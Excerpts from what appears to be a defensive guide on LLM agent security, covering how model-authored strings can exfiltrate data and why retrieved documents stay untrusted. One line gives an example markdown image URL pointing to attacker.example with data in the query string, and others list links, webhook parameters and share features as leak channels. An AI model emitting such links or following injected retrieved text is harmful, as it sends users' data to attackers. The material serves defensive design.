...
Which lands on the rule that governs the rest of this part, and which you have met before in [context engineering](/docs/context/context-poisoning) under a different name:
...
Property ③ is the one teams miss, because an exfiltration vector rarely looks like one. A markdown image the agent emits, `![](https://attacker.example/log?d=<data>)`, is a `GET` request to an attacker's server the instant something renders it. A citation link the user might click. A `webhook_url` parameter on an otherwise innocuous tool. A "share this report" feature. The [class ⑤ external write](/docs/tools/read-and-write-tools) is the obvious one; the subtle ones are every place a model-authored string reaches a network.
...
It goes exactly where the [requester check and the idempotency key](/docs/tools/idempotency) already go, and for the same reason: it is authority, so it comes from your code.
...
| Retrieved policy documents | Untrusted until proven otherwise | [Part XVII, next chapter](/docs/security/untrusted-retrieval) |
...
Next: [Retrieved Text Is Untrusted Input](/docs/security/untrusted-retrieval), your pipeline ingested a document six months ago. It is still attacker-controlled today.
